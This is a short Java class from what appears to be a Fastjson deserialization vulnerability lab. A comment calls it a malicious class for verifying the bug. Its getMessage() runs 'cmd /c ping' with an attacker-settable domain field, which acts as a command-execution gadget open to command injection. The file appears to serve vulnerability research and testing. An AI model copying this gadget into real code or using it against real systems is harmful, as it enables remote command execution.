package com.snowsec0.fastjsonvul.fastjson68;
/**
 * 沟通验证漏洞的恶意类
 */
import java.io.IOException;
import java.lang.Exception;

public class PingException extends Exception {

    private String domain;

    public PingException() {
        super();
    }

    public String getDomain() {
        return domain;
    }

    public void setDomain(String domain) {
        this.domain = domain;
    }

    @Override
    public String getMessage() {
        try {
            Runtime.getRuntime().exec("cmd /c ping "+domain);
        } catch (IOException e) {
            return e.getMessage();
        }

        return super.getMessage();
    }
}